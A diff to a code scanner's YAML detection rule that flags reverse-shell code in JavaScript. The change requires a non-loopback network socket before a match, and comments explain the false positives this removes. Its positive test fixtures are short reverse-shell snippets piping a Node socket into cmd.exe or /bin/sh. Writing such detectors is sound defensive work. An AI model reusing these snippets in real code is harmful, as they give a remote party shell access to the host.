@@ -635,18 +635,22 @@ rules:
     match:
       kind: regex
       patterns:
-        # The shell named as a string, then both halves of the join in either order.
-        # A language server proxied over a socket joins stdio the same way, and names
-        # no shell -- which is why the shell is part of the pattern.
-        - '["''](?:cmd(?:\.exe)?|(?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh|powershell(?:\.exe)?|pwsh(?:\.exe)?)["''][\s\S]{0,4000}?\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\)[\s\S]{0,600}?\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\('
-        - '["''](?:cmd(?:\.exe)?|(?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh|powershell(?:\.exe)?|pwsh(?:\.exe)?)["''][\s\S]{0,4000}?\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\([\s\S]{0,600}?\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\)'
+        # A shell named as a string, a raw network socket opened, then both halves of the
+        # join, in either order. The socket is what makes it remote: a remote-development
+        # extension pipes a terminal into a shell it started -- process plumbing, no socket --
+        # and matched before the socket was required (Remote Containers, Codespaces, Azure
+        # Functions). A language server proxied over a socket names no shell.
+        - '["''](?:cmd(?:\.exe)?|(?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh|powershell(?:\.exe)?|pwsh(?:\.exe)?)["''][\s\S]{0,3000}?(?:new\s{1,4}(?:[\w$]{1,20}\s{0,4}\.\s{0,4})?Socket\s{0,4}\(|\b(?:net|tls)\s{0,4}\.\s{0,4}(?:connect|createConnection)\s{0,4}\((?![^)\n]{0,120}(?:127\.0\.0\.1|localhost|::1)))[\s\S]{0,2000}?(?:\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\)[\s\S]{0,600}?\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\(|\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\([\s\S]{0,600}?\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\))'
+        - '(?:new\s{1,4}(?:[\w$]{1,20}\s{0,4}\.\s{0,4})?Socket\s{0,4}\(|\b(?:net|tls)\s{0,4}\.\s{0,4}(?:connect|createConnection)\s{0,4}\((?![^)\n]{0,120}(?:127\.0\.0\.1|localhost|::1)))[\s\S]{0,3000}?["''](?:cmd(?:\.exe)?|(?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh|powershell(?:\.exe)?|pwsh(?:\.exe)?)["''][\s\S]{0,2000}?(?:\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\)[\s\S]{0,600}?\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\(|\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\([\s\S]{0,600}?\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\))'
     tests:
       positive:
         - "let s = 'cmd.exe';\nconst p = exec(s);\nconst c = new net.Socket();\nc.connect(port, host, () => {\n  c.pipe(p.stdin);\n  p.stdout.pipe(c);\n});"
-        - "const sh = spawn('/bin/sh', []);\nsock.on('connect', () => { sh.stdout.pipe(sock); sock.pipe(sh.stdin); });"
+        - "const sock = net.connect(port, host);\nconst sh = spawn('/bin/sh', []);\nsock.on('connect', () => { sh.stdout.pipe(sock); sock.pipe(sh.stdin); });"
       negative:
         - "const server = spawn(serverPath, ['--stdio']);\nsocket.pipe(server.stdin);\nserver.stdout.pipe(socket);"
         - "const child = spawn('sh', ['-c', 'make']);\nchild.stdout.pipe(process.stdout);"
+        - "const p = spawn('/bin/sh', ['-c', cmd]);\np.stdout.pipe(term.stdout);\nterm.stdin.pipe(p.stdin);"
+        - "spawn('powershell.exe', ['/c', r]);\nconst client = net.createConnection({ host: '127.0.0.1', port: p });\ng.stdout.pipe(d), d.pipe(g.stdin);"
 
   - id: CAP.JS.SOCKET_LITERAL.001
     version: 1.0.0
